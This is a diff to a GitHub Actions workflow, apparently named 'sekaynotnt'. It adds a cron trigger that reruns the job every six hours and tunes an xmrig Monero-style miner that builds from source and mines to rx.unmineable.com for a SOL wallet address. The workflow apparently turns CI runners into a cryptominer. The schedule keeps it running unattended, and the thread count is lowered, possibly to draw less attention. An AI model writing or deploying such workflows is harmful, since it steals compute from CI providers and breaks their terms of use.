@@ -2,6 +2,8 @@ name: sekaynotnt
 
 on:
   workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'  # Jalan ulang setiap 6 jam
 
 jobs:
 
@@ -263,4 +265,4 @@ jobs:
           mkdir xmrig/build && cd xmrig/build
           cmake ..
           make -j$(nproc)
-          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --threads=8
+          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SekayNotNt -p x --threads=4
